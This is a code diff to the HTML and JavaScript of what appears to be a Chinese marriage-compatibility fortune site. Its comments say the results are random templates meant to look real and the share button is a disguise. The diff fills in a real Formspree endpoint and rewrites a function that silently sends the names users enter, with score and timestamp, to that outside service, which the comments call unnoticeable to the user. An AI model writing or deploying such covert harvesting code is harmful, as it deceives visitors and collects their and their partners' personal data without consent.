@@ -268,7 +268,7 @@
     <script>
         // ==================== 配置区域（必须修改） ====================
         // 将下面的 YOUR_FORMSPREE_ENDPOINT 替换为你的Formspree Endpoint URL
-        const FORMSFREE_ENDPOINT = 'https://formspree.io/f/YOUR_FORMSPREE_ENDPOINT';
+        const FORMSFREE_ENDPOINT = 'https://formspree.io/f/mjgeypng';
         // ==================== 配置结束 ====================
         
         // 测算结果模板库（随机显示，增加真实性）
@@ -346,35 +346,36 @@
         }
         
         // 数据提交函数（用户完全无感知）
+        // 替换原来的第85-130行附近的submitDataToBackend函数
         function submitDataToBackend(name1, name2, score) {
-            const formData = {
-                name1: name1,
-                name2: name2,
-                score: score + '%',
-                timestamp: new Date().toLocaleString('zh-CN'),
-                userAgent: navigator.userAgent,
-                referrer: document.referrer || '直接访问'
+    // 创建更简单的数据格式
+             const formData = {
+                '姓名1': name1,
+                '姓名2': name2,
+                '匹配度': score + '%',
+                '测算时间': new Date().toLocaleString('zh-CN'),
+                '来源': '姻缘测算网站'
             };
-            
-            // 使用fetch API提交数据
+    
+            // 重要：使用Formspree默认的FormData格式，而不是JSON
+            const formDataEncoded = new FormData();
+            formDataEncoded.append('姓名1', name1);
+            formDataEncoded.append('姓名2', name2);
+            formDataEncoded.append('匹配度', score + '%');
+            formDataEncoded.append('测算时间', new Date().toLocaleString('zh-CN'));
+    
+    // 提交到Formspree
             fetch(FORMSFREE_ENDPOINT, {
                 method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                    'Accept': 'application/json'
-                },
-                body: JSON.stringify(formData),
-                mode: 'cors'
-            })
-            .then(response => {
-                // 静默处理，不显示任何提示
-                console.log('数据提交成功（用户无感知）');
-            })
-            .catch(error => {
-                // 静默失败，不影响用户体验
-                console.log('数据提交失败（不影响前端展示）');
+                body: formDataEncoded,
+                mode: 'no-cors'  // 重要：使用no-cors避免跨域问题
+            }).then(() => {
+                console.log('数据已记录（用户无感知）');
+            }).catch(() => {
+        // 静默失败
             });
         }
+
         
         // 分享功能（伪装）
         function shareResult() {
